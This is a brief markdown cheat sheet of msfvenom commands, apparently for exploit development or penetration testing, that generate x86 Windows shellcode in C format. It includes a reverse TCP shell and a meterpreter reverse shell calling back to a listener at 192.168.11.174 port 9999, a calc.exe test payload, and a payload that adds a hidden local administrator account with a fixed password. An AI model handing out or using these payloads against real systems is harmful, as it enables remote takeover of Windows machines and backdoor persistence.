# x86 Stageless

reverse tcp
```sh
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.11.174 LPORT=9999 -f c
```

meterpreter
```sh
msfvenom -a x86 --platform windows -p windows/meterpreter_reverse_tcp  LHOST=192.168.11.174 LPORT=9999 -f c
```

calc
```sh
msfvenom -a x86 --platform windows -p windows/exec CMD="calc.exe" -f c
```

create local admin user
```sh
msfvenom -a x86 --platform windows -p windows/exec CMD="net user john Mdp@Secure123 /add;net localgroup Administrators john /add" -f c
```
